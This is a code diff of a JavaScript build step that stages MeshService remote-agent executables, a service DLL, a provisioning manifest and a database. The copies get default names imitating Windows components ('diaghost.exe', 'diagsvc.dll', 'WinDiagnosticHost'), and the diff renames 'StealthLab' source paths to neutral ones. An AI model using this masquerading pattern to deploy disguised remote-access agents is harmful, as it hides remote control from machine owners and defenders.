@@ -157,16 +157,16 @@ function main() {
     ensureDir(artifactsDir);
 
     const stagedDefinitions = [
-        ['x64-agent-exe', 'meshservice/x64/StealthLab/MeshService-2022.exe', 'MeshService64.exe'],
-        ['x64-agent-exe', 'meshservice/x64/StealthLab/MeshService-2022.exe', 'MeshService-2022.exe'],
-        ['x64-agent-exe', 'meshservice/x64/StealthLab/MeshService-2022.exe', branding.branding.binaryName || 'diaghost.exe'],
-        ['win32-agent-exe', 'meshservice/StealthLab/MeshService-2022.exe', 'MeshService.exe'],
-        ['service-dll', 'meshservice/x64/StealthLab_DLL/MeshService-2022.dll', 'MeshService-2022.dll'],
-        ['service-dll', 'meshservice/x64/StealthLab_DLL/MeshService-2022.dll', branding.branding.serviceDllName || 'diagsvc.dll'],
-        ['provisioning-manifest', 'meshservice/x64/StealthLab/MeshService-2022.msh', 'MeshService-2022.msh'],
-        ['provisioning-manifest', 'meshservice/x64/StealthLab/MeshService-2022.msh', `${branding.branding.serviceName || 'WinDiagnosticHost'}.msh`],
-        ['agent-database', 'meshservice/x64/StealthLab/MeshService-2022.db', 'MeshService-2022.db'],
-        ['agent-database', 'meshservice/x64/StealthLab/MeshService-2022.db', branding.artifacts.databaseName || 'diaghost.db'],
+        ['x64-agent-exe', 'meshservice/x64/MeshServiceRuntime/MeshService-2022.exe', 'MeshService64.exe'],
+        ['x64-agent-exe', 'meshservice/x64/MeshServiceRuntime/MeshService-2022.exe', 'MeshService-2022.exe'],
+        ['x64-agent-exe', 'meshservice/x64/MeshServiceRuntime/MeshService-2022.exe', branding.branding.binaryName || 'diaghost.exe'],
+        ['win32-agent-exe', 'meshservice/MeshServiceRuntime/MeshService-2022.exe', 'MeshService.exe'],
+        ['service-dll', 'meshservice/x64/MeshServiceBundle/MeshService-2022.dll', 'MeshService-2022.dll'],
+        ['service-dll', 'meshservice/x64/MeshServiceBundle/MeshService-2022.dll', branding.branding.serviceDllName || 'diagsvc.dll'],
+        ['provisioning-manifest', 'meshservice/x64/MeshServiceRuntime/MeshService-2022.msh', 'MeshService-2022.msh'],
+        ['provisioning-manifest', 'meshservice/x64/MeshServiceRuntime/MeshService-2022.msh', `${branding.branding.serviceName || 'WinDiagnosticHost'}.msh`],
+        ['agent-database', 'meshservice/x64/MeshServiceRuntime/MeshService-2022.db', 'MeshService-2022.db'],
+        ['agent-database', 'meshservice/x64/MeshServiceRuntime/MeshService-2022.db', branding.artifacts.databaseName || 'diaghost.db'],
     ];
 
     const stagedFiles = [];
